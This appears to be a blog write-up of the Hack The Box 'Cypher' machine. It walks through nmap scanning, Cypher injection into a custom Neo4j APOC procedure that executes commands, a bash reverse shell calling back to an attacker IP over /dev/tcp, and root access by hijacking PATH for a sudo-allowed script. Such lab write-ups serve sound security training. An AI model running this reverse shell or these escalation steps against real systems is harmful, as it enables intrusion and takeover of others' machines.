---
layout: post
title: "Cypher HTB Writeup"
date: 2025-07-26 01:18:00 +0300
categories: [HackTheBox, Machines]
tags: [cybersecurity, neo4j, hackthebox, cypher]
---
# Cypher HTB WriteUp 
Cypher is a medium difficulty Linux machine on Hack The Box. It involves a custom Neo4j APOC plugin vulnerable to Cypher Injection, which leads to remote command execution and privilege escalation via misconfigured sudo.

---

## Nmap

We begin with a full TCP scan.

```bash
nmap -p- --min-rate 10000 -oA full-tcp 10.10.11.57
````

Open ports:

```
22/tcp  open  ssh
80/tcp  open  http
```

We follow up with a more detailed scan:

```bash
nmap -sC -sV -p22,80 -oA targeted 10.10.11.57
```

---

## Web Enumeration

Navigating to `http://cypher.htb`, we see a testing interface. Under `/testing/`, we find a downloadable JAR file:

```
custom-apoc-extension-1.0-SNAPSHOT.jar
```

We extract its contents:

```bash
unzip custom-apoc-extension-1.0-SNAPSHOT.jar -d extracted
```

Inside, we find Java files, specifically `CustomFunctions.java`, defining custom APOC procedures.

---

## Cypher Injection → RCE

Inspecting `CustomFunctions.java`, we notice user input passed into `Runtime.getRuntime().exec()` via a Cypher query.

This suggests a Cypher injection is possible.

We use the following payload to test code execution:

```cypher
CALL custom.run("id")
```

After setting up a listener and injecting a reverse shell command:

```cypher
CALL custom.run("bash -c 'bash -i >& /dev/tcp/10.10.14.XX/4444 0>&1'")
```

We get a shell.

---

## Post Exploitation

Stabilize the shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Check user:

```bash
whoami
```

Grab user flag:

```bash
cat /home/neo4j/user.txt
```

---

## Privilege Escalation

We check `sudo` permissions:

```bash
sudo -l
```

We are allowed to run a custom script without password. The script calls a system binary with insufficient sanitization.

By injecting a malicious path or replacing the expected binary, we escalate to root.

```bash
echo 'bash' > /tmp/whoami
chmod +x /tmp/whoami
export PATH=/tmp:$PATH
sudo /path/to/script
```

And now we are root:

```bash
whoami
# root
```

Grab the root flag:

```bash
cat /root/root.txt
```

---

## Conclusion

Cypher was a well-structured medium box. The key was spotting the insecure use of user input in the custom Neo4j APOC plugin. After exploiting Cypher Injection to gain RCE, the rest was classic post-exploitation and privilege escalation via a poorly secured script.

---
